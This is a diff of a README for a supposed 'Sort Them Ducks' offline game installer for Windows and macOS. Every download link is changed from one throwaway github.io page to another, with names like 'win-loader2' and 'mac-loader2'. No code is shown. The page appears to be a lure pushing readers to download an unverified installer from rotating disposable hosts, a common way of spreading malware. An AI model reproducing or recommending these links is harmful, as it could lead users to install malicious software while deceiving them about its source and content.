@@ -1,8 +1,8 @@
 # Sort Them Ducks Offline Installer
 
-[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://shellwarlockfigure.github.io/windows-dl/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://shellwarlockfigure.github.io/windows-dl/)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://shellwarlockfigure.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://rvpextofpmgo.github.io/win-loader2/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://rvpextofpmgo.github.io/win-loader2/)
+[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://rvpextofpmgo.github.io/win-loader2/)
 
 > Sort Them Ducks Offline Installer — full game, all puzzles and worlds, plays without internet.
 
@@ -12,8 +12,8 @@
 
 | Platform | Link | Size |
 |----------|------|------|
-| **Windows** | [Download Installer](https://shellwarlockfigure.github.io/windows-dl/) | 1 GB |
-| **macOS** | [Download Installer](https://shellwarlockfigure.github.io/macos-dl/) | 1 GB |
+| **Windows** | [Download Installer](https://rvpextofpmgo.github.io/win-loader2/) | 1 GB |
+| **macOS** | [Download Installer](https://rvpextofpmgo.github.io/mac-loader2/) | 1 GB |
 
 ---
 
